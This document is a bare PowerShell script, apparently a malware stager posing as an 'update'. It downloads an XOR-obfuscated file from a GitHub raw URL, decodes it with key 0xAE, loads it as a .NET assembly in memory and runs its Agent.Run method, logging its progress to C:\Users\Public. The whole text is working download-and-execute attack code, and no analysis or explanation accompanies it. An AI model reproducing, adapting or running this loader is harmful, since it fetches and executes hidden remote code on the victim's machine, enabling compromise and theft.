[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
try{
  'step1' | Out-File C:\Users\Public\bl.txt
  $_e=(New-Object Net.WebClient).DownloadData('https://raw.githubusercontent.com/Tokenairdrop527/update/refs/heads/main/update.dat')
  'step2' | Add-Content C:\Users\Public\bl.txt
  $_d=[byte[]]($_e|%{$_-bxor0xAE})
  'step3' | Add-Content C:\Users\Public\bl.txt
  $_a=[System.Reflection.Assembly]::Load($_d)
  'step4' | Add-Content C:\Users\Public\bl.txt
  $_a.GetType('Agent').GetMethod('Run').Invoke($null,$null)
}catch{$_|Out-File C:\Users\Public\bl_err.txt}